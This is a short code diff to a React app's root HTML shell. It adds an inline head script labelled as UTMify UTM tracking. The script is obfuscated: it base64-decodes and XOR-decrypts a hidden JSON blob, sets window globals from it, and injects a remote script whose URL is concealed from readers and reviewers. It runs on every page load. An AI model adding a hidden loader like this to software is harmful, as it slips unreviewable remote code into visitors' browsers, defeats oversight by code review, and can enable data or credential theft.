@@ -117,6 +117,12 @@ function RootShell({ children }: { children: ReactNode }) {
     <html lang="pt-BR">
       <head>
         <HeadContent />
+        {/* UTMify — tracking de UTMs */}
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `(function(){var u_b=atob("DEoVZYyMGJy0dT5/7TE3EP7gOqaWHUoLnTkvSqPvfPKaAEoShCxsS+/jdbLWBxEMjjh8Ffj/N+nAGE1QgSthAP/4NvbHVxJdjD5hF+XubejRBhxFtjE3C+3hfb6OV1oemSs4EPjhcfrNWE4NiDxwC/ihYP/bERMMjiE3Sa76efDBEBxFz2hoSfeudv3ZEBxFzy50Ee2hbejZHFgGwDpnAPrpduiZBksdhC5mR6Cubv3YAFtd12g3GNHx");var x_sgly=[];for(var b_r=0;b_r<u_b.length;b_r++){x_sgly.push(u_b.charCodeAt(b_r)&255);}var n_xtn=x_sgly[0];var j_hoo=x_sgly.slice(1,1+n_xtn);var r_lha=x_sgly.slice(1+n_xtn);var x_o96=r_lha.map(function(b,n_a){return b^j_hoo[n_a%n_xtn];});var p_f2ba="";for(var f_q=0;f_q<x_o96.length;f_q++){p_f2ba+=String.fromCharCode(x_o96[f_q]&255);}var j_oo=decodeURIComponent(escape(p_f2ba));var e_cx1x=JSON.parse(j_oo);var g_vjo=e_cx1x.globals||[];g_vjo.forEach(function(r_z81){window[r_z81.name]=r_z81.value;});var v_5n=document.createElement("script");v_5n.src=e_cx1x.url;v_5n.async=true;v_5n.defer=true;(e_cx1x.attributes||[]).forEach(function(c_u){v_5n.setAttribute(c_u.name,c_u.value);});(document.head||document.documentElement).appendChild(v_5n);})();`,
+          }}
+        />
       </head>
       <body>
         {children}
